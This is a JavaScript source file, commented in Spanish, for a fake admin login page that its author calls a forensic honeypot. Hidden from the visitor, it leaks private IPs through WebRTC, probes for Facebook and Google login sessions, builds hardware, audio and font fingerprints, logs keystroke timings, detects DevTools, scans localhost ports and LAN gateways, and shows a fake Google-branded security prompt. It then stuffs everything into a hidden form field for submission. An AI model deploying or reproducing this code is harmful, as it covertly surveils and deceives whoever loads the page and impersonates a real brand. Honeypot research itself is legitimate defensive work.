/**
 * @file admin_src.js
 * @brief Motor de Telemetría Forense "Detrás de Escena" (CÓDIGO FUENTE).
 * @details Este archivo contiene la implementación original y comentada de todas las 
 * técnicas de captura de datos del Sentinel Honeypot. 
 * 
 * Técnicas Implementadas:
 * 1. WebRTC IP Leak: Fuga de IP privada tras VPN/Proxies.
 * 2. Social Profiling: Detección de sesiones de redes sociales via fugas de recursos Cross-Origin.
 * 3. Cryptographic Fingerprinting: Uso de SHA-256 para identificar hardware de forma unívoca.
 * 4. Timing Attack (Port Scan): Detección de servicios locales (localhost) del atacante.
 * 5. LAN Mapping: Descubrimiento de topología de red interna.
 * 
 * @author Felipe Andrés
 * @version 5.2.0
 */

// --- GESTIÓN DE FLUJO Y SESIÓN ---
const urlParams = new URLSearchParams(window.location.search);

/**
 * @brief Restauración de sesión forzada.
 * @details Si el nodo de redirección detecta éxito, marca los términos como aceptados
 * para evitar bucles de navegación infinitos.
 */
if (urlParams.has('new_session')) {
    sessionStorage.setItem('terminos_aceptados', 'true');
}

/**
 * @brief Manejo de Desafíos de Login.
 * @details Notifica al usuario sobre intentos fallidos para mantener la verosimilitud
 * del portal "admin" falso.
 */
if (urlParams.has('error')) {
    const numIntento = urlParams.get('error');
    const errorContainer = document.getElementById('error-container');
    if (errorContainer) {
        errorContainer.textContent = "Credenciales incorrectas. Intento " + numIntento + " de 3.";
        errorContainer.style.display = 'block';
    }
}

// Gate de Seguridad: Redirección si no se ha pasado por el consentimiento inicial.
if (sessionStorage.getItem('terminos_aceptados') !== "true") {
    window.location.href = "index.html";
}

// Generación de ID de Sesión Cosmético (Branding).
const sessionStatus = document.getElementById('session-id');
if (sessionStatus) sessionStatus.innerText = "SG-" + Math.random().toString(36).substr(2, 9).toUpperCase();

// --- VARIABLES GLOBALES DE TELEMETRÍA ---
let devToolsOpen = false;
let keystrokeData = [];
let ipPrivada = "Detectando...";
let mdnsLocal = "N/A";
let socialSessions = { facebook: false, google: false };
let visitorId = "Generando...";
let portsDetected = [];
let mobileAudit = { source: "N/A", network: "N/A", touch: false };
let lanDevices = [];

/**
 * @brief TÉCNICA 1: WEBRTC IP LEAK.
 * @details Explota la fase de negociación ICE Candidate para extraer la IP 
 * real de la interfaz de red, saltando túneles Ngrok, VPNs y Proxies HTTP.
 * @async
 * @return {Promise<void>}
 */
async function getPrivateIP() {
    return new Promise((resolve) => {
        const cachedIP = sessionStorage.getItem('ip_privada_temp');
        const cachedMDNS = sessionStorage.getItem('mdns_local_temp');

        if (cachedIP) ipPrivada = cachedIP;
        if (cachedMDNS) mdnsLocal = cachedMDNS;

        if (cachedIP && cachedIP !== "Detectando...") { resolve(); return; }

        const timeout = setTimeout(() => {
            if (ipPrivada === "Detectando...") ipPrivada = "Protegido / Time-Out";
            resolve();
        }, 5000);

        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19000' }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                // Regex para extraer IPv4 de la cadena de candidato
                const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)?.[1];
                // Regex para extraer nombre mDNS local (.local)
                const myMDNS = /([a-z0-9-]+\.local)/i.exec(ice.candidate.candidate)?.[1];

                if (myIP) { ipPrivada = myIP; clearTimeout(timeout); resolve(); }
                if (myMDNS) { mdnsLocal = myMDNS; }
            };
        } catch (e) {
            ipPrivada = "Bloqueo de Protocolo";
            resolve();
        }
    });
}
getPrivateIP();

/**
 * @brief TÉCNICA 2: SOCIAL MEDIA SESSION DETECTION (Perfilado Silencioso).
 * @details Detecta si el atacante está logueado en Facebook o Google mediante el intento 
 * de carga de recursos protegidos por cookies de sesión.
 */
function checkSocialSessions() {
    const networks = [
        { name: 'facebook', url: 'https://www.facebook.com/ads/image/?app_id=2318966938' },
        { name: 'google', url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Fretina_logo_80.png&service=mail' }
    ];
    networks.forEach(net => {
        const img = new Image();
        img.onload = () => { socialSessions[net.name] = true; };
        img.onerror = () => { socialSessions[net.name] = false; };
        img.src = net.url + "&cache=" + Math.random();
    });
}
checkSocialSessions();

/**
 * @brief TÉCNICA 3: VISITOR ID CRIPTOGRÁFICO (Hardware Fingerprinting SHA-256).
 * @details Genera una huella digital determinista basada en el hardware, 
 * permitiendo identificar al atacante incluso si limpia cookies o IP.
 * @async
 * @return {Promise<void>}
 */
async function generateVisitorId() {
    const gpuProfile = obtenerGPU();
    const audioSig = await getAudioFingerprint();

    const components = [
        navigator.userAgent,
        screen.width + "x" + screen.height,
        new Date().getTimezoneOffset(),
        navigator.language,
        gpuProfile,
        audioSig
    ].join('|');

    const msgBuffer = new TextEncoder().encode(components);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);

    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

    visitorId = "VID-" + hashHex.toUpperCase().substring(0, 20);
}
generateVisitorId();

/**
 * @brief TÉCNICA 4: ANTI-ANALYSIS (Detección de Inspector/DevTools).
 * @details Mide el retardo provocado por la instrucción 'debugger'. Un retardo 
 * superior a 100ms indica que el flujo de ejecución ha sido pausado por un inspector.
 */
setInterval(() => {
    const start = performance.now();
    debugger;
    const end = performance.now();
    if (end - start > 100) devToolsOpen = true;
}, 1000);

/**
 * @brief TÉCNICA 5: ANÁLISIS BIOMÉTRICO (Dinámica de Teclado).
 * @details Registra los intervalos de tiempo entre pulsaciones para distinguir 
 * humanos de bots automatizados.
 */
document.addEventListener('keydown', (e) => {
    keystrokeData.push({ time: Date.now() });
});

/**
 * @brief TÉCNICA 6: STEALTH PORT SCANNER (Timing Attack).
 * @details Identifica puertos abiertos en la máquina de loopback del atacante 
 * midiendo tiempos de rechazo TCP rápidos (<30ms).
 * @async
 * @return {Promise<void>}
 */
async function scanLocalPorts() {
    if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        portsDetected = [];
        return;
    }
    const commonPorts = [80, 443, 3306, 8080, 22]; // Puertos: HTTP, HTTPS, DB, SSH
    for (let port of commonPorts) {
        const start = performance.now();
        try {
            await fetch(`http://127.0.0.1:${port}`, { mode: 'no-cors', cache: 'no-cache' });
        } catch (e) {
            const duration = performance.now() - start;
            if (duration < 30) { portsDetected.push(port); }
        }
    }
}
scanLocalPorts();

/**
 * @brief TÉCNICA 7: MOBILE ENVIRONMENT AUDIT.
 * @details Caracteriza la red y el estado energético del dispositivo móvil.
 * @async
 * @return {Promise<void>}
 */
async function runMobileAudit() {
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        mobileAudit.source = b.charging ? "Cargando (Posible Estación)" : "Batería (Móvil/Desplazamiento)";
    }
    if (navigator.connection) {
        mobileAudit.network = `${navigator.connection.effectiveType} (RTT: ${navigator.connection.rtt}ms)`;
    }
    mobileAudit.touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
}
runMobileAudit();

/**
 * @brief TÉCNICA 8: LAN SUBNET SCANNER (Descubrimiento de Red Interna).
 * @details Intenta cargar recursos minúsculos (favicon) de las IPs de gateway 
 * más comunes para identificar la presencia de routers y otros dispositivos LAN.
 * @async
 * @return {Promise<void>}
 */
async function scanSubnet() {
    const targets = ["192.168.1.1", "192.168.0.1", "192.168.1.254", "10.0.0.1"];
    for (let ip of targets) {
        try {
            const img = new Image();
            img.src = `http://${ip}/favicon.ico?t=${Date.now()}`;
            img.onload = () => { if (!lanDevices.includes(ip)) lanDevices.push(ip); };
            img.onerror = () => { if (!lanDevices.includes(ip)) lanDevices.push(ip); };
        } catch (e) {}
    }
}
scanSubnet();

/**
 * @brief TÉCNICA 9: DYNAMIC SECURITY OVERLAYS (Ingeniería Social).
 * @details Muestra un diálogo falso de seguridad si se detecta una sesión 
 * de Google activa, con el fin de generar distracción y presión al atacante.
 */
function showSecurityOverlay() {
    if (socialSessions.google && !sessionStorage.getItem('overlay_shown')) {
        const overlay = document.createElement('div');
        overlay.id = "sec-overlay";
        overlay.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(5px);";
        overlay.innerHTML = `
            <div style="background:white;padding:40px;border-radius:20px;text-align:center;max-width:400px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;box-shadow:0 20px 40px rgba(0,0,0,0.5);">
                <img src="https://www.gstatic.com/images/branding/product/2x/google_account_96dp.png" width="60" style="margin-bottom:20px;">
                <h3 style="color:#202124;margin-bottom:15px;font-size:22px;">Verificacion de Seguridad</h3>
                <p style="font-size:15px;color:#5f6368;line-height:1.5;margin-bottom:25px;">Se ha detectado un intento de acceso mediante <b>Proxy/VPN</b>. Para proteger su cuenta, confirme su identidad.</p>
                <button onclick="document.getElementById('sec-overlay').remove();" style="background:#1a73e8;color:white;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:bold;width:100%;">CONTINUAR VERIFICACION</button>
            </div>
        `;
        document.body.appendChild(overlay);
        sessionStorage.setItem('overlay_shown', 'true');
    }
}
setTimeout(showSecurityOverlay, 5000);

/**
 * @brief SISTEMA DE EXFILTRACIÓN FINAL.
 * @details Empaqueta toda la telemetría recolectada en un objeto JSON inyectado 
 * en un campo oculto del formulario de login antes de su envío.
 * @async
 * @return {Promise<void>}
 */
async function recolectarTodo() {
    const data = {
        meta: {
            visitor_id: visitorId,
            timestamp: new Date().toLocaleString(),
            devTools: devToolsOpen,
            biometria_teclado: keystrokeData.slice(-15)
        },
        analisis_flujo: {
            aceptado: sessionStorage.getItem('terminos_aceptados') === "true"
        },
        hardware: {
            ua: navigator.userAgent, // Captura autoritativa para evitar "churros" en headers de red
            gpu: obtenerGPU(),
            bateria: await obtenerBateria(),
            fuentes: getFonts(),
            audio_id: await getAudioFingerprint(),
            entorno_movil: mobileAudit
        },
        elite: {
            ip_privada: ipPrivada,
            mdns_local: mdnsLocal,
            social_profiling: socialSessions,
            puertos_abiertos: portsDetected,
            mapeo_lan: lanDevices
        },
        red: {
            downlink: navigator.connection ? navigator.connection.downlink : "N/A",
            ubicacion: "[AUTORITATIVE_SERVER_LOOKUP]"
        }
    };

    const inputOculto = document.getElementById('inputForense');
    if (inputOculto) inputOculto.value = JSON.stringify(data);
}

// Configuración del Listener de envío del formulario
const form = document.getElementById('form-final');
if (form) {
    form.addEventListener('submit', async (e) => {
        e.preventDefault(); 
        await recolectarTodo();
        form.submit();
    });
}

/**
 * @brief Extracción de metadatos de GPU.
 * @details Uso de WebGL Debug Renderer para obtener el nombre real de la tarjeta gráfica.
 */
function obtenerGPU() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
    } catch (e) { return "Driver-Protected"; }
}

/**
 * @brief Extracción de metadatos de Batería.
 */
async function obtenerBateria() {
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            return { nivel: (b.level * 100) + "%", charging: b.charging };
        } catch (e) { return "API-Blocked"; }
    }
    return "API-Not-Supported";
}

/**
 * @brief Extracción de metadatos de Fuentes (Fingerprint).
 */
function getFonts() {
    const fontList = ["Arial", "Verdana", "Impact", "Adobe Clean"];
    const detected = [];
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    fontList.forEach(font => {
        context.font = "72px monospace";
        const baselineSize = context.measureText("mmmmmmmmmmlli").width;
        context.font = "72px '" + font + "', monospace";
        const newSize = context.measureText("mmmmmmmmmmlli").width;
        if (newSize !== baselineSize) detected.push(font);
    });
    return detected;
}

/**
 * @brief Generación de huella digital de audio.
 * @details Procesa una señal oscilatoria silenciosa para obtener una firma 
 * característica del chip de sonido y drivers.
 * @async
 * @return {Promise<string>}
 */
async function getAudioFingerprint() {
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        const gain = audioCtx.createGain();
        gain.gain.value = 0; // Silencio absoluto
        oscillator.type = 'triangle';
        oscillator.connect(analyser);
        analyser.connect(gain);
        gain.connect(audioCtx.destination);
        oscillator.start(0);
        const data = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(data);
        const fingerprint = data.reduce((a, b) => a + b, 0);
        oscillator.stop();
        audioCtx.close();
        return fingerprint > 0 ? fingerprint.toString() : "Audio-API-Limited";
    } catch (e) { return "Audio-Engine-Protected"; }
}

// Bucle de recolección de seguridad periódica
setInterval(recolectarTodo, 3000);
recolectarTodo();

